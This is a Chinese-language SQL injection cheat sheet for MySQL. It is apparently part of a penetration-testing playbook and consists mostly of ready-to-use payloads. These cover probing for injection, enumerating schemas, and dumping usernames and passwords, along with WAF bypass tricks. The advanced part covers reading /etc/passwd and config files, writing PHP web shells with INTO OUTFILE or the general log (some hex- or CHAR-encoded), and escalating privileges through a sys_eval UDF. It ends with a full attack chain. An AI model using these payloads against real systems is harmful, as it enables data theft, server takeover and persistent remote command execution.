# MySQL注入

## 1.1 基础探测 (sqli-mysql-basic)

**前置条件**:
- 目标存在SQL注入点
- 后端数据库为MySQL
- 了解基本SQL语法

### 执行步骤

#### 1. 探测注入点

```sql
' OR '1'='1
' OR 1=1--
1' AND '1'='1
1' AND '1'='2
```

**说明**: 使用单引号和布尔条件探测是否存在注入点

#### 2. 确定列数

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- 直到报错确定列数
```

或使用:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

#### 3. 确定显示位置

```sql
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
```

**说明**: 找出哪些列会显示在页面上

#### 4. 获取数据库信息

```sql
' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,@@hostname,3--
```

#### 5. 枚举所有数据库

```sql
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--
' UNION SELECT schema_name,2,3 FROM information_schema.schemata LIMIT 0,1--
```

#### 6. 枚举表名

```sql
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='target_db' LIMIT 0,1--
```

#### 7. 枚举列名

```sql
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 0,1--
```

#### 8. 提取数据

```sql
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
' UNION SELECT username,password,3 FROM users LIMIT 0,1--
```

### WAF绕过技术

#### 1. 大小写混淆

```sql
' UnIoN SeLeCt 1,database(),3--
' uNiOn SeLeCt 1,user(),3--
```

#### 2. 内联注释

```sql
' /*!UNION*/ /*!SELECT*/ 1,database(),3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
```

#### 3. 双写绕过

```sql
' UNUNIONION SELSELECTECT 1,database(),3--
' UNIunionON SELselectECT 1,2,3--
```

#### 4. 空格替代

```sql
'/**/UNION/**/SELECT/**/1,database(),3--
' %0aUNION%0aSELECT%0a1,2,3--
'(UNION(SELECT(1),(database()),(3)))--
```

#### 5. 编码绕过

```sql
' UNION SELECT 1,hex(database()),3--
' UNION SELECT 1,unhex(hex(database())),3--
' UNION SELECT 1,conv(hex(database()),16,10),3--
```

---

## 1.2 高级技术 (sqli-mysql-advanced)

**前置条件**:
- MySQL用户具有FILE权限
- 知道网站绝对路径
- secure_file_priv配置允许

### 执行步骤

#### 1. 检测FILE权限

```sql
' UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user=current_user()--
' AND (SELECT file_priv FROM mysql.user WHERE user=current_user())='Y'--
```

#### 2. 获取网站路径

```sql
' UNION SELECT 1,@@basedir,3--
' UNION SELECT 1,@@datadir,3--
' UNION SELECT 1,load_file('/etc/passwd'),3--
```

#### 3. 读取敏感文件

```sql
' UNION SELECT 1,load_file('/etc/passwd'),3--
' UNION SELECT 1,load_file('/var/www/html/config.php'),3--
' UNION SELECT 1,load_file('C:/windows/win.ini'),3--
```

#### 4. 写入WebShell

```sql
' UNION SELECT 1,'<?php @eval($_POST[cmd]);?>',3 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/cmd.php'--
```

#### 5. 日志写Shell

```sql
SET GLOBAL general_log='ON';
SET GLOBAL general_log_file='/var/www/html/shell.php';
SELECT '<?php @eval($_POST[cmd]);?>';
```

#### 6. UDF提权

```sql
SELECT load_file('/tmp/lib_mysqludf_sys.so') INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('id');
```

### WAF绕过

#### Hex编码写入

```sql
' UNION SELECT 1,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,3 INTO DUMPFILE '/var/www/html/shell.php'--
```

#### Char编码绕过

```sql
' UNION SELECT 1,CHAR(60,63,112,104,112,32,64,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62),3 INTO OUTFILE '/var/www/html/s.php'--
```

---

## 攻击链示例

### 完整利用流程

1. **探测注入点** → 使用单引号、布尔条件确认是否存在注入
2. **确定列数** → 使用ORDER BY或UNION SELECT NULL
3. **确定显示位置** → 找出哪些列会回显到页面
4. **获取数据库信息** → database()、user()、version()
5. **枚举数据库结构** → information_schema库
6. **提取敏感数据** → 用户名、密码等
7. **尝试提权** → 文件读写、UDF提权

### 高级利用流程

1. **检测FILE权限和secure_file_priv配置**
2. **获取网站绝对路径**
3. **使用load_file读取敏感配置**
4. **使用INTO OUTFILE写入WebShell**
5. **如果OUTFILE被禁，使用日志写Shell**
6. **尝试UDF提权获取系统Shell**
